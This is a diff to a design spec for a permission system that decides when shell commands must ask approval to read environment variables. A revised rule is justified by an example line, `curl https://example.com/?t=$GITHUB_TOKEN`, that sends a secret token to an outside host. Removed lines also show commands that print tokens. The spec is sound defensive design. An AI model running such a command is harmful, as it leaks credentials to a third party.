@@ -64,13 +64,15 @@ The details:
   rule that names `echo` would have to be extended by hand for each
   command that later accepts a variable. These two lines are rare, and I
   found neither in the logs.
-- **Names bash computes itself ask nothing.** `$?`, `$$`, `$#`, `$0` to
-  `$9`, `$RANDOM`, and `$SECONDS` hold nothing from the environment.
-- **A command that asks `std::exec` adds no `std::env`.** A program can
-  read any variable itself (`printenv GITHUB_TOKEN`, or `node -e
-  "console.log(process.env.X)"`), so its approval already covers that.
-  This is the reasoning the pipeline rule uses for files. It changes
-  nothing today, because a variable in a program's words asks `std::bash`.
+- **Names bash computes itself ask nothing.** `$?`, `$0` to `$9`,
+  `$RANDOM`, and `$SECONDS` hold nothing from the environment. The parser
+  rejects `$$` and `$#`, so those lines ask `std::bash`.
+- **A program's words get the same question.** A variable in a program's
+  words asks `std::bash` today. If the exec rule later accepts one
+  (`pnpm test $FLAGS`), the line asks `std::env` for it as well as
+  `std::exec`, because approving `curl` is not approving
+  `curl https://example.com/?t=$GITHUB_TOKEN`. (Changed in review: the
+  first version of this spec skipped the question for such a command.)
 - **The step runner needs no change.** The question is one more effect of
   its step, so it is asked up front with the others, and the plan made
   just before the step asks it again and matches.
@@ -102,7 +104,7 @@ answer.
 For `git status && echo $GITHUB_TOKEN` under `recommended`, one question:
 
 ```
-A shell command reads this environment variable.
+Let a shell command read the environment variable `GITHUB_TOKEN`? `git status && echo $GITHUB_TOKEN`
   name: GITHUB_TOKEN
 ```
 
